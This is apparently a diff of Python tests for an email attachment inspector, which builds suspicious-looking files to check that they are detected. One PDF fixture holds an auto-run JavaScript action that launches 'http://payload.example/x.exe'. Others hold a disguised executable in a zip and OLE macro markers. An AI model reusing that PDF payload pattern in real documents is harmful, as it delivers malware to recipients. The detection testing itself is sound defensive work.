@@ -1,144 +1,97 @@
-"""
-Judging an attachment by what it is, not what it is named.
+"""The attachment inspector, against files shaped like the real thing.
 
-The previous static check read the extension and stopped:
-`macro_detected = ext in {".docm", ".xlsm", ...}`. That misses the two things
-attackers actually do — put a macro in a `.docx`, and name an executable
-`invoice.pdf`.
+This path had never run on production data — 102 stored email runs, zero
+attachments between them — so the zip, OLE and PDF branches were written and
+never exercised. These build the files rather than mocking the parse, because
+what is being tested is whether the bytes are read correctly.
+
+The clean-PDF case matters as much as the hostile ones: an inspector that
+flags every document costs more than it saves.
 """
+
+from __future__ import annotations
 
 import base64
 import io
-import os
 import zipfile
 
-os.environ.setdefault("OPENAI_API_KEY", "test-key")
-
-from app.services.email_attachment_inspection import inspect_attachment, inspect_attachments
+from app.services.email_attachment_inspection import inspect_attachments
 
 
-def _att(filename: str, data: bytes) -> dict:
-    return {"filename": filename, "content_b64": base64.b64encode(data).decode(), "sha256": "x"}
+def _b64(data: bytes) -> str:
+    return base64.b64encode(data).decode()
 
 
-def _ooxml(*names: str) -> bytes:
+def _zip_with_double_extension() -> bytes:
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w") as archive:
-        archive.writestr("word/document.xml", "<xml/>")
-        for name in names:
-            archive.writestr(name, b"payload")
+        archive.writestr("Invoice_8891.pdf.exe", b"MZ\x90\x00" + b"\x00" * 64)
+        archive.writestr("readme.txt", b"please open the invoice")
     return buf.getvalue()
 
 
-def _ids(result) -> set[str]:
-    return {finding["id"] for finding in result["findings"]}
+# A malicious PDF puts its address inside the JavaScript action, not in a
+# /URI link annotation — the annotation is what a viewer renders, and nobody
+# renders this one.
+_JS_PDF = (
+    b"%PDF-1.4\n"
+    b"1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj\n"
+    b"2 0 obj<</Type/Action/S/JavaScript/JS(app.launchURL\\('http://payload.example/x.exe'\\);)>>endobj\n"
+    b"trailer<</Root 1 0 R>>\n%%EOF\n"
+)
+
+_CLEAN_PDF = b"%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n"
+
+_OLE_WITH_MACROS = (
+    b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 40 + b"VBA_Project" + b"\x00" * 32 + b"Macros" + b"\x00" * 16
+)
 
 
-def test_a_macro_inside_a_docx_is_found_despite_the_extension():
-    """`.docx` is the macro-free extension. The archive is what tells the truth."""
-    result = inspect_attachment(_att("Quarterly-Report.docx", _ooxml("word/vbaProject.bin")))
-    assert "embedded_macro" in _ids(result)
-    assert result["worth_detonating"] is True
+def _inspect(name: str, data: bytes) -> dict:
+    out = inspect_attachments([{"filename": name, "content_b64": _b64(data)}])
+    return out["items"][0], out
 
 
-def test_an_executable_named_as_a_pdf_is_identified_by_its_magic_bytes():
-    result = inspect_attachment(_att("invoice.pdf", b"MZ\x90\x00" + b"\x00" * 128))
-    assert result["detected_type"]["kind"] == "pe"
-    assert {"type_mismatch", "executable_attachment"} <= _ids(result)
+def test_zip_hiding_an_executable_behind_a_document_name():
+    item, out = _inspect("archive.zip", _zip_with_double_extension())
+    assert item["inspected"] is True
+    assert item["detected_type"]["kind"] == "zip"
+    assert any(f["severity"] == "high" for f in item["findings"])
+    assert any("Invoice_8891.pdf.exe" in f["detail"] for f in item["findings"])
+    assert out["risk"] == "high"
+    assert "archive.zip" in out["detonation_candidates"]
 
 
-def test_urls_inside_a_pdf_are_recovered():
-    """A link in an attachment is invisible to a body-text URL scan."""
-    pdf = (
-        b"%PDF-1.7\n/Annots[<</A<</URI(https://phish.example/verify)/S/URI>>>>]\n%%EOF"
-    )
-    result = inspect_attachment(_att("statement.pdf", pdf))
-    assert result["extracted_urls"] == ["https://phish.example/verify"]
+def test_pdf_javascript_is_reported_once_not_twice():
+    """/JavaScript and /JS both appear in real PDFs and mean the same thing."""
+    item, _ = _inspect("statement.pdf", _JS_PDF)
+    js_findings = [f for f in item["findings"] if "JavaScript" in f["detail"]]
+    assert len(js_findings) == 1, js_findings
+    assert js_findings[0]["severity"] == "high"
 
 
-def test_pdf_javascript_and_auto_open_are_reported():
-    pdf = b"%PDF-1.7\n/OpenAction<</S/JavaScript/JS(app.alert\\(1\\))>>\n%%EOF"
-    result = inspect_attachment(_att("doc.pdf", pdf))
-    assert "pdf_javascript" in _ids(result)
+def test_url_inside_pdf_javascript_is_recovered():
+    """The /URI annotation pattern alone never sees this one."""
+    _, out = _inspect("statement.pdf", _JS_PDF)
+    assert "http://payload.example/x.exe" in out["urls_found_in_attachments"]
 
 
-def test_a_double_extension_is_reported():
-    result = inspect_attachment(_att("photo.jpg.exe", b"MZ" + b"\x00" * 32))
-    assert "double_extension" in _ids(result)
+def test_open_action_is_reported_separately_from_javascript():
+    item, _ = _inspect("statement.pdf", _JS_PDF)
+    assert any("opens an action automatically" in f["detail"] for f in item["findings"])
 
 
-def test_an_executable_inside_an_archive_is_reported():
-    result = inspect_attachment(_att("docs.zip", _ooxml("setup.exe")))
-    assert "executable_in_archive" in _ids(result)
+def test_ole_macro_streams_are_detected():
+    item, out = _inspect("quarterly.doc", _OLE_WITH_MACROS)
+    assert item["detected_type"]["kind"] == "ole"
+    assert any("macro" in f["detail"].lower() for f in item["findings"])
+    assert out["risk"] == "high"
 
 
-def test_an_ordinary_document_produces_nothing():
-    """Quiet on real attachments, or the signal is worthless."""
-    result = inspect_attachment(_att("notes.docx", _ooxml()))
-    assert result["findings"] == []
-    assert result["worth_detonating"] is False
-
-
-def test_an_attachment_without_retained_content_says_so():
-    result = inspect_attachment({"filename": "big.iso", "sha256": "x"})
-    assert result["inspected"] is False
-    assert result["reason_not_inspected"]
-
-
-def test_the_summary_lists_only_files_worth_a_sandbox_credit():
-    result = inspect_attachments([
-        _att("clean.docx", _ooxml()),
-        _att("macro.docx", _ooxml("word/vbaProject.bin")),
-    ])
-    assert result["detonation_candidates"] == ["macro.docx"]
-    assert result["risk"] == "high"
-
-
-# ── The sandbox budget ────────────────────────────────────────────────────────
-
-
-def _gate(vt_found: bool, attachments: list[dict], run_anyrun: bool = True):
-    """Run the attachment check with every external call stubbed out."""
-    from unittest.mock import patch
-    from app.services import email_indicator_checks_service as svc
-
-    inspection = {"detonation_candidates": ["macro.docx", "second.docx"]}
-    with patch.object(svc, "_vt_lookup", return_value={"found": vt_found}), \
-         patch.object(svc, "_anyrun_hash_ti_lookup", return_value={"checked": True}), \
-         patch.object(svc, "_detonate_attachment", return_value={"submitted": True, "reason": "detonated"}) as det:
-        result = svc._check_attachments(
-            attachments, max_hashes=5, run_anyrun=run_anyrun, inspection=inspection
-        )
-    return det.call_count, result
-
-
-def test_a_file_virustotal_already_knows_is_not_detonated():
-    """A known hash needs no sandbox credit."""
-    calls, _ = _gate(True, [_att("macro.docx", _ooxml("word/vbaProject.bin"))])
-    assert calls == 0
-
-
-def test_a_file_local_inspection_liked_is_not_detonated():
-    """Unknown to reputation is not on its own a reason to spend a credit."""
-    calls, _ = _gate(False, [_att("notes.txt", b"hello")])
-    assert calls == 0
-
-
-def test_an_unknown_and_suspicious_file_is_detonated():
-    calls, _ = _gate(False, [_att("macro.docx", _ooxml("word/vbaProject.bin"))])
-    assert calls == 1
-
-
-def test_at_most_one_attachment_per_email_is_detonated():
-    """AnyRun credits are finite; one email must not be able to drain them."""
-    calls, result = _gate(False, [
-        _att("macro.docx", _ooxml("word/vbaProject.bin")),
-        _att("second.docx", _ooxml("word/vbaProject.bin")),
-    ])
-    assert calls == 1
-    assert "budget" in result["items"][1]["sandbox"]["reason"].lower()
-
-
-def test_nothing_is_submitted_when_anyrun_is_disabled():
-    calls, _ = _gate(False, [_att("macro.docx", _ooxml("word/vbaProject.bin"))], run_anyrun=False)
-    assert calls == 0
+def test_a_plain_pdf_produces_nothing():
+    """The control. Over-reporting here taxes every clean email."""
+    item, out = _inspect("harmless.pdf", _CLEAN_PDF)
+    assert item["inspected"] is True
+    assert item["findings"] == []
+    assert out["risk"] == "none"
+    assert out["detonation_candidates"] == []
